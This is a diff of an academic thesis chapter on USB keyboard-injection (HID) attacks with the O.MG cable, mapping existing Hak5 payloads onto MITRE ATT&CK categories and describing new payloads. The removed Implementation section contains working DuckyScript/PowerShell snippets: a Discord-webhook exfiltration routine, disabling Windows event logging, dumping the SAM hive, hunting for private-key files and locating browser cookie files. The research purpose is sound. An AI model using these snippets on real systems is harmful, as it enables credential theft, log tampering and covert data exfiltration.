@@ -2,36 +2,28 @@
 
 \section{Introduction}
 
-This chapter will describe the point of view of an attacker during a HID injection attack. To this end it will firstly evaluate existing attack payloads, describe a general architecture for an attack  it will introduce new attacks and their architecture are well as novel defense methods against those attacks. 
+This chapter will describe the point of view of an attacker during a HID injection attack. To this end it will firstly evaluate existing attack payloads, describe a general architecture for an attack and it will introduce new attacks and their architecture as well as novel defense methods against those attacks. 
 
 
-\section{Ethical Considerations}
-Attacks as described in this thesis can cause considerable harm to individuals, companies, and communities. For all the reasons explained and examples brought up in section \ref{TheDangersOfUSB} these attacks are not to be taken lightly and the potential for damage is real. For this exact reason it is important to raise awareness for this kind of attack, research existing vulnerabilities, new developments in the field, and how those can be counteracted. Investigating attacks in particular ones that are not available in a public GitHub repository is an important contribution to the scientific field and outweighs the negative. Just because these payloads cannot easily be found, does not mean they do not already exist. Which arguably makes them even more dangerous to the public and therefore their exploration is even more urgent. \\
-In section \ref{HistoryOfDefense} this thesis explains countermeasures that can be put in place to protect oneself and in section [TODO!!] new methods will be presented, specifically against new attacks introduced in section \ref{Implementation}.
-% bring up the balck/white /grey hat discussion again? or is his not scientific enough?
-
-
-\section{ATT\&CK by MITRE}
+\section{The MITRE Att\&ck Framework}
 
 ATT\&CK \cite{MITREATTCK} is an openly accessible knowledge base of adversary tactics and techniques developed by the security advisor firm MITRE \cite{WhoWeAre}. It can be used for threat modeling and to get a general overview over the different types of cyber attacks that happen in the world.
-It features 14 attack categories that themselves are subdivided into 8-43 techniques. One example is the category Reconnaissance which is divided into Active Scanning, Gather Victim Host Information, Gather Victim Identity Information, Gather Victim Network Information, Gather Victim Org Information, Phishing for Information, Search Closed Sources, Search Open Technical Databases, Search Open Websites/Domains, Search Victim Owned Websites. 
+It features 14 attack categories that themselves are subdivided into 8-43 techniques. One example is the category Reconnaissance which is divided into Active Scanning, Gather Victim Host Information, Gather Victim Identity Information, Gather Victim Network Information, Gather Victim Org Information, Phishing for Information, Search Closed Sources, Search Open Technical Databases, Search Open Websites/Domains and Search Victim Owned Websites. 
 
 
 
 \subsection{Evaluation of Existing Attack Scripts}
 
-In the following, this thesis will dive into some of those categories and techniques and evaluate whether that can be executed via keyboard injection and whether or not a script for it is available online. To this end, scripts from the official open source GitHub page for O.MG \footnote{https://github.com/hak5/omg-payloads} by Hak5 are examined. \\
+In the following, this thesis will dive into some of those categories and techniques and evaluate whether that can be executed via keyboard injection and whether or not a script for it is available online. To this end, scripts from the official open source GitHub page for O.MG \cite{Hak5Omgpayloads2024} by Hak5 are examined. \\
 It is important to note that the most basic attack that can be executed via Keyboard Injection is also the most versatile and one of the most dangerous ones. It is a simple script that downloads any malware of your choice, which as a result, could execute any software based attack.  
 This analysis will therefore focus on whether an attack has been implemented solely as keyboard injection and will not feature payloads that include downloading additional malware. It will not examine all 14 categories and instead highlight the most relevant ones. 
 
 \subsubsection{Reconnaissance}
 
-Reconnaissance is about actively or passively gathering information, often used before an attack. The gathered information can be used to inform the planning of a bigger attack or to further additional reconnaissance efforts. This category includes scanning of network traffic, gathering host information such as name, IP, operating system, hardware information, credentials, email, or information about their network. Phishing also belongs into this category, and purchasing information about the system from legal or illegal data brokers as well as gathering publicly available information, for example from the internet \cite{MITREATTCK}.
+Reconnaissance invovles actively or passively gathering information, often used before an attack. The gathered information can be used to inform the planning of a bigger attack or to further additional reconnaissance efforts. This category includes scanning of network traffic, gathering host information such as name, IP, operating system, hardware information, credentials, email, or information about their network. Phishing also belongs into this category, and purchasing information about the system from legal or illegal data brokers as well as gathering publicly available information, for example from the internet \cite{MITREATTCK}.
 
 This is a field in which keyboard injection can make considerable damage. There exist many exfiltration scripts, that download sensitive files, exfiltrate passwords, network information, and device information, or social engineer the user to enter sensitive data on malicious sites. 
-
-For example, \verb|Harvester_OF_SORROW| \cite{OmgpayloadsPayloadsLibrary} exfiltrates login information from Firefox on Windows 10. \\ 
-Other examples for password extraction are \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary} which exfiltrates sudo passwords, and \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}which steals wlan passwords and sends them to the attacker via a discord webhook. 
+For example, \verb|Harvester_OF_SORROW| \cite{OmgpayloadsPayloadsLibrary} exfiltrates login information from Firefox on Windows 10. Other examples for password extraction are \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary} which exfiltrates sudo passwords, and \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}which steals wlan passwords and sends them to the attacker via a discord webhook. 
 \verb|OMGLogger| \cite{OmgpayloadsPayloadsLibrary} leverages the logging capabilities of the O.MG cable and sends the keystrokes live to the attacker's server. \\
 The collection on GitHub has an entire folder for exfiltration scripts, that can find data on a network, a printer, a target's Spotify, Powershell history, log files, MySql history, FireFox browser cookies, fotos, or send periodic screenshots. \\
 Similarly there is a folder with scripts on phishing  \cite{OmgpayloadsPayloadsLibrary}, however, it is less extensive. The three payloads build on the idea of faking a pop up, where they prompt the user to (re)submit login data and all require some previous installations to be present and they are all written for Linux. \\
@@ -50,18 +42,18 @@ Initial Access is about an adversary trying to get access to a target network\ci
 
 \subsubsection{Execution}
 
-Execution covers all techniques used to get malicious code running on a target's computer or server using any kind of shell, coding environment, hotkeys, native APIs, or rely on the user to activate code execution, e.g. by clicking on a link or file.\cite{MITREATTCK}\\
+Execution covers all techniques used to get malicious code running on a target's computer or server using any kind of shell, coding environment, hotkeys, native APIs, or rely on the user to activate code execution, e.g. by clicking on a link or file \cite{MITREATTCK}.\\
 Running malicious code is a core component to the way Keyboard Injections are done. It is their alpha and omega and can be found in every script in the collection.
 
 \subsubsection{Persistence} \label{persistence}
 
-Persistence stresses the longevity and robustness of an attack over time, changed credentials. To this end, accounts and access rights can be manipulated, SSH keys stolen or modified, new devices registered for two factor authentication, create or modify system processes (i.e. modifying power shell profile scripts), by using external remote services, or manipulate pre-OS boot mechanisms.\cite{MITREATTCK} \\
+Persistence stresses the longevity and robustness of an attack over time, changed credentials. To this end, accounts and access rights can be manipulated, SSH keys stolen or modified, new devices registered for two factor authentication, create or modify system processes (i.e. modifying power shell profile scripts), by using external remote services, or manipulate pre-OS boot mechanisms \cite{MITREATTCK}. \\
 An example for this kind of technique is the remote access that can be gained by scripts like \verb|revshell_macOS| \cite{OmgpayloadsPayloadsLibrary} or remote control access establishment as demonstrated by \cite{bojovicRisingThreatHardware2019}. \\
 This category also includes attack scheduling, which can easily be achieved by DuckyScript, using the `DELAY` command, the remote trigger, or the Geo fencing \cite{hak5MGCable}.
 
 \subsubsection{Privilege Escalation}
 
-Privilege Escalation includes techniques used to gain higher-level permissions in a network or system, by bypassing account controls, abusing elevation control mechanisms, access token manipulation or theft, account manipulation, braking out of containers to gain access to a host \cite{MITREATTCK}, and many similar techniques as featured in \ref{persistence}. \\
+Privilege Escalation includes techniques used to gain higher-level permissions in a network or system, by bypassing account controls, abusing elevation control mechanisms, access token manipulation or theft, account manipulation, breaking out of containers to gain access to a host \cite{MITREATTCK}, and many similar techniques as featured in this section. \\
 Account manipulation can easily be achieved with the correct recon. Especially if the login of an administrator can be logged \verb|OMGLogger| \cite{OmgpayloadsPayloadsLibrary} or is stored somewhere on the system \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary}, \verb|Everything-Password-Stealer| \cite{OmgpayloadsPayloadsLibrary} privilege escalation is achievable.
 
 \subsubsection{Credential Access}
@@ -70,7 +62,7 @@ Credential Access means an adversary tries to steal usernames and passwords \cit
 
 
 \subsubsection{Collection}
-After a target has been infiltrated, the data collection process can start. It includes of techniques like Man-in-the-Middle (MIM), compressing data, browser session hijacking, audio and or image capture, clipboard data exfiltration, email collection, keylogging, etc. \cite{MITREATTCK} \\
+After a target has been infiltrated, the data collection process can start. It consists of techniques like Man-in-the-Middle (MITM), compressing data, browser session hijacking, audio and or image capture, clipboard data exfiltration, email collection, keylogging, etc. \cite{MITREATTCK} \\
 Keylogging specifically is one of the main features of the O.MG cable, as discussed previously, and further extended by \verb|Persistent_Keylogger-Telegram_Based|  \cite{OmgpayloadsPayloadsLibrary}, image capture is demonstrated by \verb|Screen-Shock| \cite{OmgpayloadsPayloadsLibrary}, or the stealing of fotos by \verb|/ExfiltratePhotosThroughShell| \cite{OmgpayloadsPayloadsLibrary}. 
 
 
@@ -82,10 +74,12 @@ Exfiltration is about how the stolen data can be relayed to the attacker \cite{M
 
 The techniques belonging to impact are not widely represented in the GitHub repository. They include scripts that try to manipulate, interrupt or destroy systems and data \cite{MITREATTCK}. However, it has been shown by \cite{lawalFacilitatingCyberenabledFraud2022} that it is possible to change, meaning manipulate, data on a target's computer without leaving traces of an attack, thereby framing the computer's user(s) for the data change. 
 
+\subsection{Conclusions drawn from existing Payloads}
 
-\subsubsection{Intermediate Conclusion}
-
-From the examples above it is apparent, that a wide variety of attacks and techniques are available with DuckyScript and a malicious USB device. Many sections of the \verb|Att&ck| model play a role and are part of various scripts for the O.MG cable that already exist. The section that is most prevalent in the available code base is focused on the gathering and exfiltration of data and gaining access to systems and networks. 
+From the examples above it is apparent, that a wide variety of attacks and techniques are available with DuckyScript and a malicious USB device. Many sections of the ATT\&CK model play a role and are part of various scripts for the O.MG cable that already exist. The most prevalent ATT\&CK categories from the available code base are focused on the gathering and exfiltration of data and the gaining of access to systems and networks. One category that is covered by hardly any payload is 'Impact' suggesting that a lot of work is still to be done in that area.
+Differences in coverage might be explained through the nature of the attack type; for some attacks it is simply not effective to use keyboard injection. Take for example 'Supply Chain Compromise' (ID T1195) which describes supply chain attacks for which products are manipulated prior to their usage. Although it would in theory be possible to manipulate for example firmware of a computer chip, there may be much more effective vectors for than a keyboard injection attack; it simply requires too much very detailed intelligence. Attacks for which the O.MG cable is more useful, like simple attacks utilizing powershell commands, or pranks like playing a video, sounds, or changing background pictures are more common. 
+Another aspect to consider is that this repository is not designed to comply with the Mitre ATT\&CK framework and has only 36 contributors. Open source programmers might just make payloads for topics that interest them or that are in their area of expertise. Their goal is not to cover as many attacks as possible. One last consideration concerning the payloads in the repository is content moderation. It is possible that some payloads are not tolerated on the repository for whatever reason the repository owners seem plausible. However, this theory is unlikely since the entire premise of Hak5 seems to be to make the dangers and attacks of the black hat world as widely known as possible in order to be able to defend against them.\\  
+In line with this sentiment, this thesis will develop novel payloads in the following chapters. Splitting the enormous spectrum of all possible cyber attacks into only 14 categories means that each of those categories still covers a very big section of attack types, each of which in turn can have a multitude of aspects and implementations. For this reason, the payloads that will be developed in this thesis cannot exclusively be attributed to 'Impact' or another underrepresented category, but instead are a collection of novel payloads that can be attributed to subtechniques of different categories. Each of the payloads is inspired by such a subtechnique and does not yet exist in the O.MG payloads Github repository. They are realistic attacks for which it makes sense to use HID injection and naturally only represent a small selection of all the paylaods that are still 'missing' from the repository were it the goal to get full coverage. 
 
 
 \section{Setup for an HID Injection Attack}
@@ -93,44 +87,56 @@ From the examples above it is apparent, that a wide variety of attacks and techn
 When preparing for an HID injection attack, a malicious actor has to pay attention to the following 5 points;
 \begin{enumerate}
     \item Target
-    \item Circumstance and Place
-    \item Time and Timing
-    \item required Hardware
-    \item required Software
+    \item Circumstance 
+    \item Required Hardware
+    \item Required Software
+    \item Place and Timing
 \end{enumerate}
 
+The target is the most crucial element and specifically for injection attacks it is much more important \emph{what} the target is instead of who. The answer to this question determines which kind of attack is carried out and what the basic payload is. The question of \emph{who} is important in so far as it influences the next point: Circumstance. For example a target that always locks their computer when stepping away from it creates the circumstance of a locked screen, in which case a password has to be acquired and injected first. Circumstance is also the target's operating system, all the information about their hardware, the defense software that might be in place, and other recon on the target, for example their habits. Once these two factors have been sufficiently explored, the question of hardware will come up. What should be used? In some specific situations a USB stick might be best. This could for example be the case when the attacker has access to a target's work station and can place the stick in an envelope with the target's name on it to trick them into plugging it in. In other situations it might be ideal to modify a keyboard and build the malicious hardware into it, or to alter a charging port in a public space. For many stealthy situations, the O.MG cable can be perfect because it seems so harmless. With a clear goal, enough information about the target's circumstance and the hardware question decided, the payload may be developed. While a basic script might already exist, it is very likely that it has to be modified to fit the specific situation. For example if it will need adjustments if it includes commands that require administrative rights or absolute file paths, or it might profit from adapting delays depending on the speed of the target's machine. \\
+Once the setup is complete, the payload has to be injected at the right time and place. The O.MG cable's remote trigger and geofencing features come in handy for this purpose. To avoid detection of and interference with the payload it is best to execute it when no one is watching or such a fast fashion that it is over before it is registered to have taken place.\\
+Naturally these steps influence each other or may overlap. This flow diagram servers as a visualization of the process:
 
-\subsubsection{Target}
+\includepdf[pages=1]{attack_flowchart.pdf}
 
-The foremost component to an attack is the target. It determines all other factors. Crucial is the goal of the attack, the level of available access, and the environment and characteristics of the target.\\
-The goal determines the type of attack, which will be further specified by the environment, characteristics and access. [where am i going with this, in how far is it even relevant?] 
 
 
 \section{Methodology} \label{methodology}
 
-\subsection{Intro}
+\subsection{Introduction}
 
-This section will give an overview over the methodologies of the developed payloads and defenses. Their implementations will be discussed in the next section \ref{Implementation}
+This section will give an overview over the methodologies of the developed payloads and defenses. Their implementations will be discussed in the next Section \ref{Implementation}. \\
 
 
 \subsection{Payloads}
 
-Payloads can follow either or a combination of two main strategies; 
+Payloads follow a combination of two main strategies; 
 \begin{enumerate}
     \item User Interface (UI) based
     \item Command Line Interface (CLI) based
 \end{enumerate}
 
-UI based payloads follow the line of action a typical UI focused User would take. For example, for sending an email, such a user might search for the email application icon on their desktop, click on it, then click on 'new Mail' and fill out all the fields of the mail form, then click on send. A payload that mimics this behaviour, would navigate in the same way, just using the keyboard instead of the mouse. For instance, if the outlook icon was the fourth icon on the taskbar, it could be selected with Windows key + 3. The 'new Mail' button would be reached with 16 tabs or by using  Ctrl + N. The entire payload would be constructed in such a manner, navigating the expected UI. \\
+UI based payloads follow the line of action a typical UI focused user would take. For example, for sending an email, such a user might search for the email application icon on their desktop, click on it, then click on 'new Mail' and fill out all the fields of the mail form, then click on send. A payload that mimics this behaviour, would navigate in the same way, just using the keyboard instead of the mouse. For instance, if the Outlook icon was the fourth icon on the taskbar, it could be selected with Windows key + 3. The 'new Mail' button would be reached with 16 tabs or by using  Ctrl + N. The entire payload would be constructed in such a manner, navigating the expected UI. \\
 The issues that might arise here become clear fast; how would you know, where on the taskbar outlook is located? What if the computer is not connected to the internet and instead of opening outlook an error message pops up? What if the computer is very slow and the Ctrl + N is sent before the email application has fully loaded?  Some of these issues can be accounted for, outlook for instance can also be opened by searching for it in the start menu, however determining whether the application has loaded is impossible with the O.MG cable. The risk can be mitigated by impelementing long delays between commands, however, this also creates a lit of time overhead which can be a big drawback in time sensitive situations. \\
 
 Fewer detail problems of this sort are caused by the CLI approach. It allows for a generally more clean and concise execution of an attack. It simplifies many actions and is often more direct and therefore faster. Take the mail example again. Powershell has a cmdlet that allows you to send email directly. This cuts down nearly all navigation and the risks and time overhead that come with it. \\
-Drawbacks of this method might be that it can be more easily detected since it is such unexpected user behaviour. An average use would not use the command line to send an email, if they ever even use a command line. Therefore actions like opening the Windows run window and starting powershell.exe can easily be flagged as suspicious behaviour. Another obstacle might be user priviledges. Some commands require admin access, which is easy to deal with if the target is the admin user on the computer (simply deal with the popup) but requires the admin user's password if the target is not admin themselves. 
+Drawbacks of this method might be that it can be more easily detected since it is such unexpected user behaviour. An average user would not use the command line to send an email, if they ever even use a command line. Therefore actions like opening the Windows run window and starting powershell.exe can easily be flagged as suspicious behaviour. Another obstacle might be user priviledges. Some commands require admin access, which is easy to deal with if the target is the admin user on the computer (simply deal with the popup) but requires the admin user's password if the target is not admin themselves. 
 
 
-Payloads can either have some kind of impact on the system, be used to exfiltrate some data or both.
+The following sections will present these payloads, with their respective ATT&CK categories in parentheses:
+\begin{enumerate}
+    \item Register Email Forwarding (Collection)
+    \item Disable Windows Event Logging (Defense Evasion)
+    \item Extract SSH Hashes (Defense Evasion)
+    \item Extract Private Key Files (Defense Evasion)
+    \item Steal Web Session Cookies (Defense Evasion)
+    \item Iteratively End Processes (Impact)
+    \item Schedule Processes (Persistence)
+\end{enumerate}
 
-In the following, developed payloads will be presented.
+\includepdf[pages=1]{payloads_treediagram.pdf}
+
+
 
 \subsubsection{Register Email Forwarding}
 
@@ -152,7 +158,7 @@ Access to these files is restricted to admin privileges on Windows, so this payl
 
 \subsubsection{Extract Private Key Files}
 
-Public key cryptography builds on the notion of private and public keys that are calculated from a shared mathematical basis, such as the difficulty of factoring large prime numbers (in RSA) or solving the discrete logarithm problem (in EC). While it is extremely time and resource consuming to try and reverse these calculations, one more simple way to breach this security mechanism is to simply steal the keys. Often, such private keys are stored in private key files that have corresponding file extensions and are stored in common file locations. Therefore, it is possible to search default directories for private key files for the mentioned file extensions and extract them.    
+Public key cryptography builds on the notion of private and public keys that are calculated from a shared mathematical basis, such as the difficulty of factoring large prime numbers (in RSA \cite{rivestMethodObtainingDigital1978}). While it is extremely time and resource consuming to try and reverse these calculations, one more simple way to breach this security mechanism is to simply steal the keys. Often, such private keys are stored in private key files that have corresponding file extensions and are stored in common file locations. Therefore, it is possible to search default directories for private key files for the mentioned file extensions and extract them.    
 
 
 \subsubsection{Steal Web Session Cookies}
@@ -163,7 +169,7 @@ An attack that does this, first has to determine which browser should be targete
 
 \subsubsection{Iteratively End Processes} \label{Iteratively End Processes}
 
-One underexplored area of the Mitre Att\&ck framework is the persistance category. This Payloads aims to achieve persistance by iteratively ending running processes. There's two modes to the payload; white- and blacklist. It can easily be modified to only end a predefined set of application when it detects them as running, or it can end everything except for a predefined set of applications. This modification can be done depending on the goal of the attacker. 
+One underexplored area of the Mitre Att\&ck framework is the persistance category. This payload aims to achieve persistance by iteratively ending running processes. There's two modes to the payload; white- and blacklist. It can easily be modified to only end a predefined set of application when it detects them as running, or it can end everything except for a predefined set of applications. This modification can be done depending on the goal of the attacker. 
 
 
 \subsubsection{Schedule Processes}
@@ -171,323 +177,11 @@ One underexplored area of the Mitre Att\&ck framework is the persistance categor
 One under explored area of the Mitre Att\&ck framework is persistence. This Payloads aims to achieve persistence by registering processes that will run iteratively depending on a customizable trigger. This processes can be anything from recon scripts, to other persistence payloads, like for example the end processes payload \ref{Iteratively End Processes} which could run in the background if set up like this.
 
 
-\section{Implementation} \label{Implementation}
+\section{Conlcusion}
 
-\subsection{Prerequisites}
-
-The payloads presented in this chapter have the following prerequisites:
-\begin{enumerate}
-    \item Undisturbed input: while the payload is executing there may be no other HID input, especially no keypresses. A keypress will almost certainly throw off the execution of the payload, as will clicking, and especially switching focus to another window.
-    \item Windows: these payloads were written for Windows 11 with Powershell, it is not guaranteed that they will work on any other system.
-    \item Unlocked state: the payloads in this paper assume that the target computer is not locked. However, the payload can include a few lines to unlock the computer, if the password is known. If it is not known, it can be found out if the O.MG cable is used to keylog an external keyboard on which the password is typed. 
-    \item Known Keyboard language: These Payloads are written for a DE-CH layout but can be adjusted for any other layout. It is crucial that the layout set in the payload (default US) is the same as the layout language of the victim. If it is not known, the keymapper functionality of the keyboard can be used to determine it. 
-\end{enumerate}
-
-\subsection{Basics}
-
-Many payloads contain one or more common basic building blocks, namely opening application (mostly Powershell), getting admin rights, sending some data or how to close and application to cover up tracks.  \\
-This section will give a short overview over those use cases and how they can be implemented.
-
-
-\subsubsection{Opening an application}
-
-On windows, there are several ways to open an application. This can be rather complicated, i.e. finding the executable in the files and running it, or simply searching it in the windows search menu and accessing it from there. These are some of the ways in which applications can be opened;
-\begin{enumerate}
-    \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the windows run menu, which can be opened with the windows key + r. Here the name of the application can be entered, i.e. powershell or powershell.exe. Additionally, it can work with parameters like --incognito can be used in combination with brave.exe to open a private tab of the brave browser. Or another example is opening powershell with window style hidden:
-    \begin{lstlisting}
-    STRING GUI r
-    STRINGLN powershell.exe -windowstyle hidden
-    \end{lstlisting}
-    \item Many windows system applications can be accessed through the windows power menu, which is accessed with windows key + x. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As illustration the following implementation uses this approach to open Task Manager:
-    \begin{lstlisting}
-    STRING GUI x
-    STRING t
-    \end{lstlisting}
-    \item Another windows menu can be used to open applications; the windows run menu. Simply pressing the windows key will open it, and autofocus the cursor to the search bar, such that the application name can be typed. It is advisable to type out the entire name of the desired application to make sure the correct version is selected (i.e. 'Outlook (new)' instead of just 'Outlook' to ensure that the new and not the old version is opened). It is also important to give the system some time to load the search results and not program the enter key immediately after starting the search
-    \begin{lstlisting}
-    STRING GUI
-    STRING Microsoft Teams (work or school)
-    DELAY 100
-    ENTER
-    \end{lstlisting}
-    \item Lastly, windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, ctrl + shift + escape to open task manager. Application on the toolbar can similarly be openend through windows key + their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run an payload that looks like this to open it:
-    \begin{lstlisting}
-    GUI + 1
-    \end{lstlisting}
-\end{enumerate}
-
-In general it holds, as always, that the best choice is the fastest and most reliable one, which would be the run windows option or the default shortcuts. Using the search menu creates time overhead and is a very obvious way of searching since the menu takes up such a big part of the screen. 
-
-\subsubsection{Admin Rights}
-
-Acquiring admin rights is mainly an issue when trying to execute admin level command in powershell. For these operations, poweshell should be run as administrator. \\
-The most straight forward approach for this is to use the power user menu and selecting Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to aks if the application should be allowed to make changes to the device. 'Yes' can be selected and powershell will open run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
-\begin{lstlisting}
-GUI x
-DELAY 100
-STRINGLN a
-DELAY 600
-LEFTARROW
-DELAY 50
-ENTER
-\end{lstlisting}
-
-Another option is to search powershell in the search menu and navigating to the option 'Run as Administrator' \\
-\begin{lstlisting}
-GUI
-STRING Powershell
-DELAY 300
-RIGHTARROW
-DELAY 50
-DOWNARROW
-ENTER
-\end{lstlisting}
-
-\subsubsection{Closing applications}
-
-In Windows exists a little menu for every open window. It can be accessed by right clicking somewhere in the header of the window, or more simply having it focused and pressing the Alt and Space key on the keyboard simultaneously. \\
-The menu features the options '\underline{R}estore', '\underline{M}ove', '\underline{S}ize', 'Mi\underline{n}imize', 'Ma\underline{x}imize', and '\underline{C}lose'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or closing them after running a payload to cover tracks.
-\begin{lstlisting}
-ALT SPACE
-DELAY 50
-STRING c
-\end{lstlisting}
-It is important to keep in mind, that the name of these options and with that their shortcuts are dependent on the system language. \\
-Another common shortcut for closing focused windows is Alt F4.
-\begin{lstlisting}
-ALT F4
-\end{lstlisting}
-\\
-
-An option specifically for closing powershell windows is the shell keyword 'exit' :
-\begin{lstlisting}
-STRINGLN exit
-\end{lstlisting}
-
-
-\subsubsection{Sending Recon to a Server}
-
-When gathering some information form the victim's laptop, the question arises how this information can be forwarded to the attacker. While there is a myriad for possibilities for this, ranging from physical attraction, to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
-One option to send out information is to send it to an already established server. The O.MG repository on github features examples for sending intel to a dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a requently used communication channel like this, is that it looks very iconspicuous and will probably pass through firewalls.\\
-One example of sending an xml object to a discord webhook given the webhook address and the content for the xml object:
-\begin{lstlisting}
-STRING $xmlObject = [xml]$xmlContent
-ENTER
-STRING $Payload = @{xml = $xmlObject}
-ENTER
-STRING $Json = @{content = $Payload | ConvertTo-Json } | ConvertTo-Json	
-ENTER
-STRING Invoke-RestMethod -Uri $Webhook -Method Post -Body $Json -ContentType 'application/json'
-ENTER
-\end{lstlisting}
-
-This approach would also be possible with a custom server by replacing the webhook with the server address.
+This chapter introduced the underlying architecture and methodology for both the attack side through the newly developed payloads as well as the defense by introducing the developed defense system and its components. 
+It started off by introducing the MITRE ATT\&CK framework and some of it's 14 categories. Then, it mapped the payloads form the official open source O.MG payloads repository on GitHub onto those categories to find out which techniques were already present and available and which ones were underrepresented or missing completely. After that, it introduced the architecture of a few payloads that would fill some of those gaps using the techniques that had not yet been featured in the source code. \\
+In a second section of the chapter, the thesis outlined a defense framework that featured ... [TODO]
 
 
 
-\subsection{Payloads}
-
-\subsubsection{Register Email Forwarding}
-
-This payload is UI based, since it is using outlook. The difficulty for using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
-The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example for how tricky it can be to use the UI approach; every menu option that is selected, prompts a small load delay that has to be factor into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
-Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded to. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, in order to mask their steps, the attacker should restart outlook to close the message such that the victim has less chance of discovering the attack. \\
-To illustrate this attack the following lines show some of the navigational steps:
-
-
-\begin{lstlisting}
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-ENTER
-DELAY 2000
-TAB
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-DOWNARROW
-DELAY 100
-\end{lstlisting}
-
-Of course, the delay (in milliseconds) can be adjusted depending on the expected speed of the target machine. 
-
-
-
-
-\subsubsection{Disable Windows Event Logging}
-
-This thesis presents two approaches to windows event logging.
-
-\textbf{UI} 
-
-This implementation opens the Windows Event log application through the Windows Run window and navigates to the correct pane where it disables the logging.
-This approach mimics the action of a UI focused user. As explained in section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
-The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:
-
-\begin{lstlisting}
-DELAY 1000
-TAB
-DELAY 2000
-STRING m
-DELAY 2000
-TAB
-DELAY 2000
-ENTER
-DELAY 6000
-TAB
-DELAY 2000
-TAB
-DELAY 2000
-TAB
-DELAY 2000
-TAB
-DELAY 2000
-\end{lstlisting}
-
-\textbf{CLI}
-
-Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in section \ref{methodology} \\
-
-Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
-The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
-
-\begin{lstlisting}
-STRINGLN Stop-Service -Name "eventlog"
-DELAY 200
-STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
-DELAY 300
-STRINGLN exit
-\end{lstlisting}
-
-
-\subsubsection{Extract SSH hashes}
-
-Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the windows system by storing it in a file and the sending that file to a command server. \\
-Once admin privileges on a terminal have been secured, this is a straight forward process. 
-
-
- \begin{lstlisting} 
- STRINGLN reg save HKLM\SAM C:\sam.hiv
- \end{lstlisting}
-
-\subsubsection{Extract Private Key Files}
-
-File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 
-
-\begin{lstlisting}
-DUCKY_LANG DE_CH
-DELAY 50
-GUI r
-DELAY 200
-STRINGLN powershell.exe
-DELAY 2500
-STRINGLN $entryPoint = "your/path"
-DELAY 200
-STRINGLN $extensions = @(".key", ".pgp", ".gpg", ".ppk", ".p12", ".pem", ".pfx", ".cer", ".p7b", ".asc")
-DELAY 200
-STRINGLN Get-ChildItem -Path $entryPoint -Recurse | ForEach-Object {
-DELAY 200
-STRINGLN     if ($_.PSIsContainer) {
-DELAY 200
-STRINGLN         return
-DELAY 200
-STRINGLN     }
-DELAY 200
-DELAY 200
-STRINGLN     if ($extensions -contains $_.Extension) {
-DELAY 200
-STRINGLN         Write-Host "File found: $($_.FullName)"
-DELAY 200
-STRINGLN     }
-DELAY 200
-STRINGLN }
-DELAY 50
-ENTER
-DELAY 200
-STRINGLN exit
-\end{lstlisting}
-
-
-\subsubsection{Steal Web Session Cookies}
-
-A client's default browser can be extracted via Powershell using only one line:
-\begin{lstlisting}
-STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
-\end{lstlisting}
-
-After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is firefox, they could start a terminal, navigate to the default directory for firefox cookies and extract that file.
-
-\begin{lstlisting}
-STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
-\end{lstlisting}
-
-The same approach can be used for chrome, the difference is in the file path.
-
-\begin{lstlisting}
-STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-\end{lstlisting}
-
-\subsubsection{Iteratively End Processes}
-
-Finding and ending processes on Windows can be done with powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
-This is an excerpt of the whitelist mode;
-
-\begin{lstlisting}
-STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
-DELAY 5
-STRINGLN while("true"){
-DELAY 5
